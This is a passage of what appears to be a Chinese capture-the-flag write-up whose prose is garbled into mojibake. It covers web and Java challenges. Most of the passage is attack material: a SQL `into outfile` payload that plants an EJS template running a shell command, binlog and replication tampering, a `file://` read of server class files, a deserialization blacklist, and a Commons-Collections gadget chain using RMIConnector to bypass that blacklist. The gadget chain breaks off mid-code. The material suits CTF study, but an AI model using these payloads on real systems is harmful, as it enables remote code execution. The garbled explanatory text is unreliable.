ä¸ºBinary Logä¸ä¼šè®°å½•selectè¯­å¥ï¼Œéœ€è¦æŠŠç”Ÿæˆçš„binlogæ–‡ä»¶æ‹¿å‡ºæ¥è¿›è¡Œæ›¿æ¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp mydb:/var/lib/mysql/mysql-bin.000001 mysql-bin.000001</span><br></pre></td></tr></table></figure><p>æ›¿æ¢insertè¯­å¥ä¸ºselectè¯­å¥ä»è€Œå†™å…¥shellï¼Œç‰¹åˆ«æ³¨æ„selectå’Œinsertå‘½ä»¤é•¿åº¦å¿…é¡»ä¸€æ ·</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;%= process.mainModule.require(&quot;child_process&quot;).execSync(&quot;/readflag&quot;).toString() %&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/home/ezblog/views/114.ejs&#x27;</span></span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pPJnK5n"><img src="https://s1.ax1x.com/2023/08/22/pPJnK5n.png" alt="pPJnK5n.png"></a></p><p><a href="https://imgse.com/i/pPJn12V"><img src="https://s1.ax1x.com/2023/08/22/pPJn12V.png" alt="pPJn12V.png"></a></p><p>ä¿®æ”¹åï¼ˆæ”¾å›æ•°æ®åº“å®¹å™¨é‡Œï¼‰ä½¿ç”¨mysqlbinlogæ£€æŸ¥æ–‡ä»¶æ˜¯å¦æŠ¥é”™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker cp mysql-bin.000001 mydb:/var/lib/mysql/mysql-bin.000001</span><br><span class="line">mysqlbinlog mysql-bin.000001</span><br></pre></td></tr></table></figure><p><strong>ä»æœåŠ¡å™¨</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> mysql.gtid_slave_pos  (`domain_id` <span class="type">int</span>(<span class="number">10</span>) UNSIGNED <span class="keyword">NOT</span> <span class="keyword">NULL</span>,`sub_id` <span class="type">bigint</span>(<span class="number">20</span>) UNSIGNED <span class="keyword">NOT</span> <span class="keyword">NULL</span>,`server_id` <span class="type">int</span>(<span class="number">10</span>) UNSIGNED <span class="keyword">NOT</span> <span class="keyword">NULL</span>,`seq_no` <span class="type">bigint</span>(<span class="number">20</span>) UNSIGNED <span class="keyword">NOT</span> <span class="keyword">NULL</span>,<span class="keyword">PRIMARY</span> KEY (`domain_id`, `sub_id`) <span class="keyword">USING</span> BTREE) ENGINE <span class="operator">=</span> InnoDB <span class="type">CHARACTER</span> <span class="keyword">SET</span> <span class="operator">=</span> latin1 <span class="keyword">COLLATE</span> <span class="operator">=</span> latin1_swedish_ci COMMENT <span class="operator">=</span> <span class="string">&#x27;Replication slave GTID position&#x27;</span> ROW_FORMAT <span class="operator">=</span> <span class="keyword">Dynamic</span>; #éœ€è¦æ‰‹åŠ¨åˆ›å»ºmysql.gtid_slave_pos</span><br><span class="line"></span><br><span class="line">change master <span class="keyword">to</span> master_host<span class="operator">=</span><span class="string">&#x27;ip&#x27;</span>, master_user<span class="operator">=</span><span class="string">&#x27;slave&#x27;</span>, master_password<span class="operator">=</span><span class="string">&#x27;123456&#x27;</span>, master_port<span class="operator">=</span><span class="number">8001</span>, master_log_file<span class="operator">=</span><span class="string">&#x27;mysql-bin.000001&#x27;</span>, master_log_pos<span class="operator">=</span><span class="number">0</span>, master_connect_retry<span class="operator">=</span><span class="number">30</span>; #æ›¿æ¢æˆå¯¹åº”çš„é…ç½®ï¼Œmaster_log_poséƒ½ä»<span class="number">0</span>å¼€å§‹å°±å¥½</span><br><span class="line"></span><br><span class="line"><span class="keyword">start</span> slave; #å¯åŠ¨å¤åˆ¶</span><br><span class="line"><span class="keyword">show</span> slave status;</span><br></pre></td></tr></table></figure><p>æˆåŠŸåº”å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><a href="https://imgse.com/i/pPJn3vT"><img src="https://s1.ax1x.com/2023/08/22/pPJn3vT.png" alt="pPJn3vT.png"></a></p><p>æœ€åå»æ¸²æŸ“å†™è¿›å»çš„ejsæ¨¡æ¿å°±å¥½ï¼Œå¯ä»¥çœ‹åˆ°é€šè¿‡selectå†™è¿›å»çš„æ–‡ä»¶å¯è¯»</p><p><a href="https://imgse.com/i/pPJnJrF"><img src="https://s1.ax1x.com/2023/08/22/pPJnJrF.png" alt="pPJnJrF.png"></a></p><p><a href="https://imgse.com/i/pPJI8N6"><img src="https://s1.ax1x.com/2023/08/23/pPJI8N6.png" alt="pPJI8N6.png"></a></p><h2 id="ä½ çš„æƒé™æ”¾ç€æˆ‘æ¥"><a href="#ä½ çš„æƒé™æ”¾ç€æˆ‘æ¥" class="headerlink" title="ä½ çš„æƒé™æ”¾ç€æˆ‘æ¥"></a>ä½ çš„æƒé™æ”¾ç€æˆ‘æ¥</h2><p>æ‰«å‡º<code>/change</code>è·¯ç”±ï¼Œä¿®æ”¹<code>jom@roomke.com</code>çš„å¯†ç  å¾—åˆ°flag flag{test_flag}</p><h2 id="ez-java-agagin-rev"><a href="#ez-java-agagin-rev" class="headerlink" title="ez_java_agagin_rev"></a>ez_java_agagin_rev</h2><p>åŒæ ·çš„è¯»æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Imagefile?url1=file:////usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/ctf/help_me/Servlet/CmdServlet.class%23java</span><br></pre></td></tr></table></figure><p>ä¸‹è½½åçš„<code>.class</code>æ–‡ä»¶å’Œ<code>0xff</code>åšè¿‡å¼‚æˆ–ï¼Œä¸èƒ½ç›´æ¥è¢«åç¼–è¯‘ï¼Œéœ€è¦å’Œ<code>0xff</code>å¼‚æˆ–å›å»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Imagefile&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> original_file:</span><br><span class="line">    original_data = original_file.read()</span><br><span class="line"></span><br><span class="line">xored_data = <span class="built_in">bytes</span>(byte ^ <span class="number">0xff</span> <span class="keyword">for</span> byte <span class="keyword">in</span> original_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;CmdServlet.class&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> new_file:</span><br><span class="line">    new_file.write(xored_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;CmdServlet.class æ–‡ä»¶å·²ç”Ÿæˆ&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>CmdServlet.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.help_me.Servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.configuration.ConfigurationException;</span><br><span class="line"><span class="keyword">import</span> org.nibblesec.tools.SerialKiller;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;CmdServlet&quot;, urlPatterns = &#123;&quot;/closetome&quot;&#125;)</span></span><br><span class="line"><span class="comment">/* loaded from: Imagefile */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CmdServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;exp&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] b = Base64.getDecoder().decode(exp);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ois = <span class="keyword">new</span> <span class="title class_">SerialKiller</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b), <span class="string">&quot;config/serialkiller.xml&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ConfigurationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ois.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e2) &#123;</span><br><span class="line">            e2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªæ˜äº†çš„ååºåˆ—åŒ–ç‚¹ï¼Œä½†åŠ è½½äº†<code>config/serialkiller.xml</code>å¯¹ååºåˆ—åŒ–è¿›è¡Œé™åˆ¶</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">This XML file does not appear to have any style information associated with it. The document tree is shown below.</span><br><span class="line"><span class="comment">&lt;!--  serialkiller.conf  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">refresh</span>&gt;</span>6000<span class="tag">&lt;/<span class="name">refresh</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mode</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--  set to &#x27;false&#x27; for blocking mode  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">profiling</span>&gt;</span>false<span class="tag">&lt;/<span class="name">profiling</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mode</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">logging</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">enabled</span>&gt;</span>false<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">logging</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">blacklist</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--  ysoserial&#x27;s CommonsCollections1,3,5,6 payload   --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.Transformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.functors\.InstantiateFactory$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.traxTrAXFilter$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.functorsFactoryTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>javax\.management\.BadAttributeValueExpException$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.keyvalue\.TiedMapEntry$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.functors\.ChainedTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.trax\.TemplatesImpl$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.trax\.TrAXFilter$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.security\.SignedObject$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.Transformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.functors\.InstantiateFactory$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.traxTrAXFilter$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.functorsFactoryTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--  ysoserial&#x27;s CommonsCollections2,4 payload   --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.beanutils\.BeanComparator$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.Transformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>com\.sun\.rowset\.JdbcRowSetImpl$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.rmi\.registry\.Registry$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.rmi\.server\.ObjID$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.rmi\.server\.RemoteObjectInvocationHandler$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.springframework\.beans\.factory\.ObjectFactory$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.springframework\.core\.SerializableTypeWrapper\$MethodInvokeTypeProvider$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.springframework\.aop\.framework\.AdvisedSupport$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.springframework\.aop\.target\.SingletonTargetSource$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.springframework\.aop\.framework\.JdkDynamicAopProxy$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.springframework\.core\.SerializableTypeWrapper\$TypeProvider$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.springframework\.aop\.framework\.JdkDynamicAopProxy$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.util\.PriorityQueue$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.lang\.reflect\.Proxy$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>javax\.management\.MBeanServerInvocationHandler$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>javax\.management\.openmbean\.CompositeDataInvocationHandler$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.beans\.EventHandler$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.util\.Comparator$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.reflections\.Reflections$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">blacklist</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">whitelist</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>.*<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">whitelist</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åŒæ—¶åœ¨libé‡Œå‘ç°<code>commons-collections-3.2.1.jar</code>ä¾èµ–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Imagefile?url1=file:////usr/local/tomcat/webapps/ROOT/WEB-INF/lib%23java</span><br></pre></td></tr></table></figure><p><code>config/serialkiller.xml</code>ä¸­è¿‡æ»¤äº†cc1-6çš„å…³é”®ç±»ï¼Œå¯¼è‡´ä¸èƒ½ç›´æ¥ååºåˆ—åŒ–ã€‚è¿™é‡Œå¯ä»¥é€‰æ‹©cc7ä½œä¸ºä»£æ›¿ï¼Œè¿‡æ»¤<code>&lt;regexp&gt;java\.security\.SignedObject$&lt;/regexp&gt;</code>ä¹Ÿç›¸å½“äºç»™äº†æç¤ºâ€”â€”äºŒæ¬¡ååºåˆ—åŒ–ï¼Œåˆ©ç”¨<code>RMIConnector</code>äºŒæ¬¡ååºåˆ—åŒ–bypasså…³é”®ç±»</p><p><strong>exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">        åŸºäºHashtableçš„åˆ©ç”¨é“¾</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc7</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line">        setField(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/&quot;</span> + getEvilCode());</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1, invokerTransformer);</span><br><span class="line">        lazyMap1.put(<span class="number">1</span>, <span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(hashMap2, invokerTransformer);</span><br><span class="line">        <span class="comment">//å°†rmiConnector putè¿›å»</span></span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, rmiConnector);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">1</span>);</span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å‚è€ƒcc6 yseoserial Node exploit</span></span><br><span class="line">        <span class="comment">//è·å–HashMapçš„tableå±æ€§</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//ä»hashmapå¯¹è±¡ä¸­è·å–tableå±æ€§çš„å€¼ï¼ˆè¿”å›çš„æ˜¯ä¸€ä¸ªHashMap.Nodeç±»å‹çš„æ•°ç»„ï¼‰</span></span><br><span class="line">        Object[] array = (Object[])table.get(hashMap1);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">//è·å–HashMap.Nodeç±»ä¸­çš„keyå±æ€§</span></span><br><span class="line">        keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        keyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//ç„¶åå°†HashMap.Nodeç±»ä¸­çš„keyå±æ€§è®¾ç½®ä¸ºrmiConnectorå¯¹è±¡</span></span><br><span class="line">        keyField.set(node, rmiConnector);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashtable);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">        